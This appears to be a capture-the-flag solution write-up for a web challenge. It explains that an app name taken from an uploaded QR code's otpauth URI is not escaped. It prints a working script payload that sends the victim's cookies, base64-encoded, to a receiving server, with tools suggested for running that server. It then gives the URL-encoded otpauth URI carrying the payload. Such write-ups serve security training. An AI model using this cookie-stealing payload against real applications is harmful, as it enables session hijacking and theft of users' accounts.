# Solution

The app is generally safe. On functionality that can be used is an upload. When you upload QR code with a proper OTP format, the name of the App won't be escaped.

Example payload:

```
<script>document.location="http://127.0.0.1:1337/" + btoa(document.cookie)</script>
```

For location you should use your own webserver that will get the request (ngrok, interact.sh, collaborator etc.)

Then you should include URL-encoded payload in the a valid otpauth URI:

```
otpauth://totp/App:%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A1337%2F%22%20%2B%20btoa%28document.cookie%29%3C%2Fscript%3E?secret=JBSWY3DPEHPK3PXP&issuer=App
```

All you have to do is make a QR code from this, upload it and wait for the request with cookie which holds the flag.
